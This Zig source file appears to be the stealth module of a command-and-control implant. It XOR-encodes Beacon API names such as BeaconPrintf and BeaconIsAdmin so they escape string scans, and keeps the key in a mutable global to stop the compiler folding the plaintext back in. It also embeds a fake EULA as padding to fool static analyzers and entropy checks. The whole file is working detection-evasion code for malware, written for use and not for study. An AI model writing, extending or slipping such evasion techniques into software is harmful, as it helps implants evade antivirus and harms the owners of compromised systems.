//! Stealth / OPSEC helpers for the Zig implant. Mirrors
//! `crates/implant/src/stealth.rs` + the XOR-encoding in
//! `crates/loader/src/exec.rs`.
//!
//! Two concerns live here:
//!
//! 1. **XOR-encoded Beacon API names.** The plain strings "BeaconPrintf" /
//!    "BeaconOutput" / "BeaconDataParse" / ... would otherwise sit in `.rdata`
//!    for a `strings` scan to flag. The encoded byte arrays below are the only
//!    thing emitted to the binary — and they are not recognizable strings
//!    (ciphertext). The plaintext is produced at *runtime* by `decAlloc` /
//!    `decInto`, so it lives only in transient stack/heap buffers, never in
//!    `.rdata`. XOR key 0x2A matches the Rust loader — keep them in sync. CRT
//!    names (`memcpy`/`__chkstk`/...) stay literal: every C program has them.
//!
//!    The key is held in a mutable global (`xor_key`) and read through it so the
//!    optimizer cannot constant-fold the XOR back into a plaintext `.rdata`
//!    blob. (A `const` key over `const` ciphertext is fully foldable.)
//!
//! 2. **Benign string padding.** `benign_padding` is a block of ordinary,
//!    application-looking English text (a fake EULA) embedded via `@embedFile`
//!    and `export`'d so the linker keeps it. It dilutes the suspicious strings
//!    a static analyzer would otherwise see and keeps overall entropy low
//!    (English prose is low-entropy). It is never read at runtime.

const std = @import("std");

/// XOR key shared with `crates/loader/src/exec.rs` (SYM_XOR_KEY = 0x2A). The
/// encoded arrays below are this key XOR'd against the plaintext symbol names.
/// Held in a mutable global so the optimizer can't fold the runtime decode into
/// a plaintext constant.
var xor_key: u8 = 0x2A;

// Encoded symbol names (plaintext XOR 0x2A). Mirror the `*_ENC` constants in
// `crates/loader/src/exec.rs` exactly — change both together. These are the
// only byte arrays emitted for symbol names; the ciphertext is not a
// recognizable string.
pub const ENC_BEACON_DATA_PARSE = [_]u8{ 0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x6E, 0x4B, 0x5E, 0x4B, 0x7A, 0x4B, 0x58, 0x59, 0x4F };
pub const ENC_BEACON_DATA_INT = [_]u8{ 0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x6E, 0x4B, 0x5E, 0x4B, 0x63, 0x44, 0x5E };
pub const ENC_BEACON_DATA_SHORT = [_]u8{ 0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x6E, 0x4B, 0x5E, 0x4B, 0x79, 0x42, 0x45, 0x58, 0x5E };
pub const ENC_BEACON_DATA_EXTRACT = [_]u8{ 0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x6E, 0x4B, 0x5E, 0x4B, 0x6F, 0x52, 0x5E, 0x58, 0x4B, 0x49, 0x5E };
pub const ENC_BEACON_OUTPUT = [_]u8{ 0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x65, 0x5F, 0x5E, 0x5A, 0x5F, 0x5E };
pub const ENC_BEACON_PRINTF = [_]u8{ 0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x7A, 0x58, 0x43, 0x44, 0x5E, 0x4C };
pub const ENC_BEACON_IS_ADMIN = [_]u8{ 0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44, 0x63, 0x59, 0x6B, 0x4E, 0x47, 0x43, 0x44 };
pub const ENC_BEACON_PREFIX = [_]u8{ 0x68, 0x4F, 0x4B, 0x49, 0x45, 0x44 };

/// Runtime XOR-decode of `enc` into a freshly allocated, sentinel-terminated
/// buffer (caller frees with `alloc`). Used for hashmap keys that must outlive
/// the call. The plaintext exists only in this heap buffer, never in `.rdata`.
pub fn decAlloc(alloc: std.mem.Allocator, enc: []const u8) ![:0]u8 {
    const buf = try alloc.allocSentinel(u8, enc.len, 0);
    for (enc, 0..) |b, i| buf[i] = b ^ xor_key;
    return buf;
}

/// Runtime XOR-decode of `enc` into a caller-provided stack buffer (no
/// allocation). `out.len` must equal `enc.len`. Used for the short "Beacon"
/// prefix check where a heap alloc per call would be wasteful.
pub fn decInto(enc: []const u8, out: []u8) void {
    for (enc, 0..) |b, i| out[i] = b ^ xor_key;
}

// ---- Benign string padding ------------------------------------------------

const benign_data = @embedFile("benign_strings.txt");

/// A block of benign, application-like text embedded in `.rdata`. Present only
/// to dilute the suspicious strings a static analyzer would otherwise see and
/// to keep overall entropy low. `export` forces the linker to retain it; it is
/// never read at runtime.
export const benign_padding: [benign_data.len]u8 = benign_data[0..benign_data.len].*;

/// Cheap sink referenced at startup so the optimizer keeps this module linked
/// in (and thus `benign_padding` emitted) even under LTO.
pub fn touch() void {
    _ = @intFromPtr(&benign_padding);
}
